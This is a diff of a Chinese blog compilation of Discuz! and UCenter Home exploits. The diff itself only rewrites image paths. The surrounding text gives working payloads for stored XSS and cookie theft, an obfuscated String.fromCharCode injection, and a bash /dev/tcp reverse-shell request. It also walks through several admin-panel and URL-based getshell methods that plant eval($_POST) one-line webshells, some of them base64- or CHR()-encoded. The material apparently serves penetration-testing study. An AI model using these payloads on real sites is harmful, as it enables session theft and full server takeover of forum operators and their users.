 <h3 id="演示5：Discuz-X2-5后台禁言xss"><a href="#演示5：Discuz-X2-5后台禁言xss" class="headerlink" title="演示5：Discuz! X2.5后台禁言xss"></a>演示5：Discuz! X2.5后台禁言xss</h3><p>在论坛首页管理 禁止用户那 输入你能管理的用户名称 然后选择禁言 理由那插入payload</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9ed50fd51c80d44b30d1b346fd2cef76.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9ed50fd51c80d44b30d1b346fd2cef76.png" class>
 
 <p>漏洞证明</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b32950a12dcb7fb8188dc1dc80af34c6.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b32950a12dcb7fb8188dc1dc80af34c6.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93645">https://www.seebug.org/vuldb/ssvid-93645</a></p>
 <h3 id="演示6：Discuz-附件解析漏洞导致XSS"><a href="#演示6：Discuz-附件解析漏洞导致XSS" class="headerlink" title="演示6：Discuz!附件解析漏洞导致XSS"></a>演示6：Discuz!附件解析漏洞导致XSS</h3><p>先新建一个php文件，写入XSS代码：&lt;img src&#x3D;1 onerror&#x3D;alert(document.cookie)&gt;</p>
 <p>然后保存再将它的后缀名字改成.rar，然后上传附件。点击附件下载，提示即将下：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/68a8742a947fff02992951aa0cac2316.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/68a8742a947fff02992951aa0cac2316.png" class>
 
 <p>右键审查元素得到一个类似下面这样附件的地址（这里不是直接在帖子中得到地址而是通过下载提示之后）</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3ad2d67da7ddda9a1debbcf85297ab27.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3ad2d67da7ddda9a1debbcf85297ab27.png" class>
 
 <p>在地址后添加一段：-request-文件名.php.html，如下：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8a939e7d6a3e0c9ac4914baea21cd08c.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8a939e7d6a3e0c9ac4914baea21cd08c.png" class>
 
 <p>当作html执行，XSS代码被触发！</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f98ab82c6ad15ee808a9ca7d8c1e3901.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f98ab82c6ad15ee808a9ca7d8c1e3901.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93631">https://www.seebug.org/vuldb/ssvid-93631</a></p>
 <h3 id="演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS"><a href="#演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS" class="headerlink" title="演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS"></a>演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS</h3><p>在抢楼-奖励楼层处添加payload</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/bacf4d3c7ada780dd70336aa196f1f6e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/bacf4d3c7ada780dd70336aa196f1f6e.png" class>
 
 <p>完成后触发xss</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a2f59445cab6af38a983487f3dc6f5f2.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a2f59445cab6af38a983487f3dc6f5f2.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93620">https://www.seebug.org/vuldb/ssvid-93620</a></p>
 <h3 id="演示8：Ucenter-Home-2-0及以下存储型XSS"><a href="#演示8：Ucenter-Home-2-0及以下存储型XSS" class="headerlink" title="演示8：Ucenter Home 2.0及以下存储型XSS"></a>演示8：Ucenter Home 2.0及以下存储型XSS</h3><p>在插入视频处，如发帖处的插入视频，设置如下payload: [flash]http:&#x2F;&#x2F;“<br>onmouseover&#x3D;’document.body.innerHTML&#x3D;String.fromCharCode(60,105,102,114,97,109,101,47,111,110,108,111,97,100,61,39,106,97,118,97,115,99,114,105,112,116,58,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,49,54,44,49,48,57,44,49,50,48,44,49,48,55,44,52,54,44,49,49,49,44,49,49,52,44,49,48,51,44,52,55,44,49,49,51,44,52,54,44,49,48,54,44,49,49,53,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,41,39,62)’[&#x2F;flash]</p>
 <p>完成后弹窗</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d2b13fa78846d28742ffa82191b67c04.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d2b13fa78846d28742ffa82191b67c04.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93654">https://www.seebug.org/vuldb/ssvid-93654</a></p>
 <h3 id="演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞"><a href="#演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞" class="headerlink" title="演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞"></a>演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞</h3><p>在发表日志内容处添加XSS代码</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/458c96f71cf70ad50ab21933475bd6f5.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/458c96f71cf70ad50ab21933475bd6f5.png" class>
 
 <p>完成后触发XSS</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/62054f437d9ba49e73fd2678d1fdb77e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/62054f437d9ba49e73fd2678d1fdb77e.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93665">https://www.seebug.org/vuldb/ssvid-93665</a></p>
 <h3 id="演示10：Discuz-4-0-头像设置处可以持久型脚本"><a href="#演示10：Discuz-4-0-头像设置处可以持久型脚本" class="headerlink" title="演示10：Discuz 4.0 头像设置处可以持久型脚本"></a>演示10：Discuz 4.0 头像设置处可以持久型脚本</h3><p>头像设置处，先选一个系统自带头像，提交，抓包。<br>将头像地址“customavatars&#x2F;190.jpg”替换为xss脚本“javascript:alert(&#x2F;大家新年快乐啊！&#x2F;)”（此处会过滤&lt;,”,’），post提交后，触发XSS</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1638f9cf5984633cb55be99ae37d7eaf.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1638f9cf5984633cb55be99ae37d7eaf.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93680">https://www.seebug.org/vuldb/ssvid-93680</a></p>
 <h3 id="演示11：Discuz-所有版本永久型跨站漏洞"><a href="#演示11：Discuz-所有版本永久型跨站漏洞" class="headerlink" title="演示11：Discuz! 所有版本永久型跨站漏洞"></a>演示11：Discuz! 所有版本永久型跨站漏洞</h3><p>个人中心里的“个人签名”没有对恶意代码进行检测，在 Discuz! 及 img<br>代码禁用的情况下仍可写入恶意代码，Discuz! 会保存并执行该代码，形成永久型跨站。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-19342">https://www.seebug.org/vuldb/ssvid-19342</a></p>
 <h3 id="演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示12：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示12：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在发帖或回帖处设置内容为“[audio]javascript:alert(document.cookie)&#x2F;&#x2F;.wav[&#x2F;audio]”，触发XSS</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/79652e8ad632488906454b64322138ad.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/79652e8ad632488906454b64322138ad.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/665eee7215f51a735d8959e74ed6878f.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/665eee7215f51a735d8959e74ed6878f.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
 <h3 id="演示13：Discuz-trade-php-数据库’注射’-bug"><a href="#演示13：Discuz-trade-php-数据库’注射’-bug" class="headerlink" title="演示13：Discuz! trade.php 数据库’注射’ bug"></a>演示13：Discuz! trade.php 数据库’注射’ bug</h3><p>问题在trade,php中，找到类似于如下请求包，设置目录以及message参数中的payload（注意：一定是199个A）</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/919047631672b116dcfdc4d117dda1ac.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/919047631672b116dcfdc4d117dda1ac.png" class>
 
 <p>之后会执行XSS。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://h2016.blog.163.com/blog/static/100863425200810413817385/">http://h2016.blog.163.com/blog/static/100863425200810413817385/</a></p>
@@ -411,15 +411,15 @@
 <p>##管理后台-已启用插件-接口信息-App key处-&gt;演示10</p>
 <p>测试步骤与截图：</p>
 <h3 id="演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729"><a href="#演示1：Discuz-1-5-2-5-后台命令执行漏洞-CVE-2018-14729" class="headerlink" title="演示1：Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)"></a>演示1：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97510">Discuz! 1.5-2.5 后台命令执行漏洞(CVE-2018-14729)</a></h3><p>在管理后台-站长-数据库-备份中选择好要备份的表、数据和备份的方式</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0127f7d9b485fd26befaa068cc25e541.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0127f7d9b485fd26befaa068cc25e541.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5630b2c719e066f4a53d2f8b0f04345a.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5630b2c719e066f4a53d2f8b0f04345a.png" class>
 
 <p>提交，使用burpsuit抓包，修改customtables[] &#x3D; pre_common_admincp_cmenu”&gt;aaa;<br>echo ‘&lt;?php phpinfo(); ?&gt;‘ &gt; phpinfo.php #</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4834856099a86c61967e688328376b56.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4834856099a86c61967e688328376b56.png" class>
 
 <p>成功</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/075d029eef73169b67670ec70ba0fa82.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/075d029eef73169b67670ec70ba0fa82.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97510">https://www.seebug.org/vuldb/ssvid-97510</a></p>
@@ -427,12 +427,12 @@
 <h3 id="演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞"><a href="#演示2：Discuz-X2-5-x2F-source-x2F-class-x2F-class-image-php-命令执行漏洞" class="headerlink" title="演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞"></a>演示2：Discuz X2.5 &#x2F;source&#x2F;class&#x2F;class_image.php 命令执行漏洞</h3><p>在发贴上传附件，上传图片附近，预览抓包修改为以下链接</p>
 <p>GET&#x2F;dzx25&#x2F;forum.php?mod&#x3D;image&amp;aid&#x3D;1&amp;size&#x3D;|bash%20i%20&gt;%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888%200&gt;%261|x300&amp;key&#x3D;68b54146d9d1bfb2ebb38f44f2427454&amp;nocache&#x3D;yes&amp;type&#x3D;1&amp;ramdom&#x3D;xfie9</p>
 <p>使用nc命令监听本地8888端口，成功获取到反弹的shell</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1b5db641a4ce869bce72c5e2b8b24531.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1b5db641a4ce869bce72c5e2b8b24531.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="http://0day5.com/archives/2846/">http://0day5.com/archives/2846/</a></p>
 <h3 id="演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞"><a href="#演示3：Discuz-6-x-x2F-7-x-x2F-include-x2F-discuzcode-func-php-代码执行漏洞" class="headerlink" title="演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞"></a>演示3：Discuz 6.x&#x2F;7.x &#x2F;include&#x2F;discuzcode.func.php 代码执行漏洞</h3><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a target="_blank" rel="noopener" href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page=1">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
 <p>1GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui;GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/44db579c2e436453ee8e8ff8091ce1bf.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/44db579c2e436453ee8e8ff8091ce1bf.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/4199432.html">https://www.cnblogs.com/milantgh/p/4199432.html</a></p>
@@ -441,10 +441,10 @@
 <p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=80723">https://bugs.shuimugan.com/bug/view?bug_no=80723</a></p>
 <h3 id="演示4：Discuz-x3-1-convert插件代码执行漏洞"><a href="#演示4：Discuz-x3-1-convert插件代码执行漏洞" class="headerlink" title="演示4：Discuz! x3.1 convert插件代码执行漏洞"></a>演示4：Discuz! x3.1 convert插件代码执行漏洞</h3><p>在该链接下：<a target="_blank" rel="noopener" href="http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0">http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</a></p>
 <p>发送如下POST请求包(设置newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));&#x2F;&#x2F;]&#x3D;aaaa)。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/45da2778bfe46d99a095dfbaf2374c4a.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/45da2778bfe46d99a095dfbaf2374c4a.png" class>
 
 <p>菜刀连接地址<a target="_blank" rel="noopener" href="http://www.test.ichunqiu/utility/convert/data/config.inc.php">www.test.ichunqiu/utility/convert/data/config.inc.php</a> 密码c</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a88ca737f9449c8b2dbb711f9ab4e966.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a88ca737f9449c8b2dbb711f9ab4e966.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-1909-1-1.html">https://bbs.ichunqiu.com/thread-1909-1-1.html</a></p>
@@ -455,26 +455,26 @@
 <p>d.访问日志，论坛根目录下生成demo.php，一句话密码：c。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/329.html">http://www.freebuf.com/vuls/329.html</a></p>
 <h3 id="演示6：Discuz-X3-1后台任意代码执行可拿shell"><a href="#演示6：Discuz-X3-1后台任意代码执行可拿shell" class="headerlink" title="演示6：Discuz! X3.1后台任意代码执行可拿shell"></a>演示6：Discuz! X3.1后台任意代码执行可拿shell</h3><p>全局–〉网站第三方统计代码–〉插入php代码,如插入 &lt;?php phpinfo();?&gt;</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5764594c6c1d33fa895f301cb0737c09.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5764594c6c1d33fa895f301cb0737c09.png" class>
 
 <p>工具–〉更新缓存[为了保险起见，更新下系统缓存]：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10295133e9efc1552d01446c06909401.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10295133e9efc1552d01446c06909401.png" class>
 
 <p>门户–&gt; HTML管理–〉设置：1）静态文件扩展名[一定要设置成htm] ：htm<br>2)专题HTML存放目录: template&#x2F;default&#x2F;portal 3)设置完，提交吧！</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/083437f5c83273d4fa237839514db0f4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/083437f5c83273d4fa237839514db0f4.png" class>
 
 <p>门户–〉专题管理–〉创建专题：1）专题标题：xyz 2）静态化名称：portal_topic_222<br>&#x2F;&#x2F;222为自定义文件名，自己要记住 3）附加内容：选择上：站点尾部信息</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5775ab219249324b0fc04ebb5950145c.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5775ab219249324b0fc04ebb5950145c.png" class>
 
 <p>提交,回到门户–〉专题管理,把刚才创建的专题开启，如下图</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ebfc8b8b2bfc3bc65ba0e44d730d66c4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ebfc8b8b2bfc3bc65ba0e44d730d66c4.png" class>
 
-<p>把刚才的专题，生成<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/add9c63ef2233ef0e42538763bc7ba6d.png" class></p>
+<p>把刚才的专题，生成<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/add9c63ef2233ef0e42538763bc7ba6d.png" class></p>
 <p>下面就是关键了，现在到了包含文件的时候了。 再新建一个专题：<br>1）专题标题，静态化名称，这2个随便写<br>2）模板名：这个要选择我们刚才生成的页面：.&#x2F;template&#x2F;default&#x2F;portal&#x2F;portal_topic_222.htm</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f56718e407689f99a980ec93427bb416.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f56718e407689f99a980ec93427bb416.png" class>
 
 <p>然后提交，就执行了&lt;?php phpinfo();?&gt;</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5caaa67f9af210b0741facc198cd1b38.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5caaa67f9af210b0741facc198cd1b38.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93612">https://www.seebug.org/vuldb/ssvid-93612</a></p>
 <h3 id="演示7：Discuz-7-1-7-2-远程代码执行漏洞"><a href="#演示7：Discuz-7-1-7-2-远程代码执行漏洞" class="headerlink" title="演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞"></a>演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞</h3><p>直接GET，利用语句：<br><a target="_blank" rel="noopener" href="http://xxxxx/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D=%7B%5C$%7Bfputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))%7D%7D">http://xxxxx/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={\${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}</a></p>
@@ -484,38 +484,38 @@
 <p><a target="_blank" rel="noopener" href="https://www.jb51.net/hack/26337.html">https://www.jb51.net/hack/26337.html</a></p>
 <h3 id="演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞"><a href="#演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞" class="headerlink" title="演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞"></a>演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞</h3><p>在该链接下：<a target="_blank" rel="noopener" href="http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3">http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
 <p>发送如下POST请求包。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d039122dcfbf095784f89ed71d9cda9d.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d039122dcfbf095784f89ed71d9cda9d.png" class>
 
 <p>可获取到webshell</p>
 <p><a target="_blank" rel="noopener" href="http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php">http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php</a></p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://blog.51cto.com/simeon/113131">http://blog.51cto.com/simeon/113131</a></p>
 <h3 id="演示9：Discuz-X2-5最新版后台管理员权限Getshell"><a href="#演示9：Discuz-X2-5最新版后台管理员权限Getshell" class="headerlink" title="演示9：Discuz!X2.5最新版后台管理员权限Getshell"></a>演示9：Discuz!X2.5最新版后台管理员权限Getshell</h3><p>在后台–&gt;站长–&gt;Ucenter设置处设置UcenterIP为: XX\\‘);eval($_POST[a])?&gt;;&#x2F;&#x2F;<br>XX</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946befb507f2380f0296e9fb588509b8.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946befb507f2380f0296e9fb588509b8.png" class>
 
 <p>发现管理页面代码出来了</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/11ccd15874dce153f7d432b879907ee4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/11ccd15874dce153f7d432b879907ee4.png" class>
 
 <p>上菜刀：<a target="_blank" rel="noopener" href="http://127.0.0.1/d25/uc_server">http://127.0.0.1/d25/uc_server</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/76a0d8d82f4ccc540d1015819f98adc7.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/76a0d8d82f4ccc540d1015819f98adc7.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93655">https://www.seebug.org/vuldb/ssvid-93655</a></p>
 <h3 id="演示10：Discuz后台getshell"><a href="#演示10：Discuz后台getshell" class="headerlink" title="演示10：Discuz后台getshell"></a>演示10：Discuz后台getshell</h3><p>后台找到应用，插件</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d5d71fbdc6185df240c12000c439fe3d.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d5d71fbdc6185df240c12000c439fe3d.png" class>
 
 <p>有一个好贷站长联盟</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/31550f4e59018e1fbba24eec7bb43e9e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/31550f4e59018e1fbba24eec7bb43e9e.png" class>
 
 <p>安装之后有一个导入接口信息</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/74f33d0c31fa5ba3b8dbd3bfde9512b4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/74f33d0c31fa5ba3b8dbd3bfde9512b4.png" class>
 
 <p>然后导入接口信息</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8dbe1fcf8edf3af872ec286dbb8e9f07.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8dbe1fcf8edf3af872ec286dbb8e9f07.png" class>
 
 <p>接口信息会放到这里</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/934bf7257cf564eb89c2776934e858ba.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/934bf7257cf564eb89c2776934e858ba.png" class>
 
 <p>然后就shell了</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/82c59a29c3788973678e4c8d6ec9d66f.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/82c59a29c3788973678e4c8d6ec9d66f.png" class>
 
